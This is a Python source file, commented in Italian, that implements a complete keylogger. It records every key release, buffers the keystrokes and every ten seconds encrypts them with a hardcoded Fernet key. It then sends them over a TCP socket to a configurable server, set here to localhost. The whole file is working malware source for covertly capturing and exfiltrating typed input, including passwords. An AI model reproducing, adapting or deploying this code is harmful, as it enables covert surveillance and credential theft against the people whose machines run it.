import keyboard # per registrare la pressione dei tasti, fa anche altro..
from threading import Timer # per il timer che ogni tot secondi fa un operazione
from datetime import datetime
from socket import *
from cryptography.fernet import Fernet

SERVER = 'localhost'
PORT = 12345
LOG_INTERVAL = 10 # in secondi

KEY = b'6717Ub-YB8Brvn2bnarriTULPLKpIcLhveFbsQ6okhM='

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = "" # variabile buffer che contiene tutti i tasti premuti all'interno del 'self.interval'

    def callback(self, event):
        """
        questo metodo viene chiamato ogni volta che accade un keyboard event
        nel nostro caso il metodo viene chiamato quando rilasciamo un tasto dopo averlo premuto
        """
        name = event.name
        if len(name) > 1: # controllo se ho premuto un tasto speciale (ctrl, alt, ...)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        """
        questo metodo viene chiamato ogni 'self.interval'
        invia i keylog e resetta il buffer
        """
        if self.log: # se c'è qualcosa nel buffer lo invio
            try:
                self.send_log()
                self.log = ""
            except:
                exit(1)
            
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True #imposto il thread come demone (muore quando il thread principale muore)
        timer.start() # faccio partire il timer

    def send_log(self):
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((SERVER, PORT))
        fernet = Fernet(KEY)
        encMessage = fernet.encrypt((self.log).encode())
        print(encMessage)
        clientSocket.send(encMessage)
        clientSocket.close()

    def start(self):
        try:
            keyboard.on_release(callback=self.callback) # faccio partire il keylogger
            self.report() # inizio a loggare i tasti premuti
            keyboard.wait() # blocco il thread corrente, aspetta che CTRL+C venga premuto
        except KeyboardInterrupt:
            print("\n[-] Received exit, exiting")

if __name__ == "__main__":
    keylogger = Keylogger(interval=LOG_INTERVAL)
    keylogger.start()
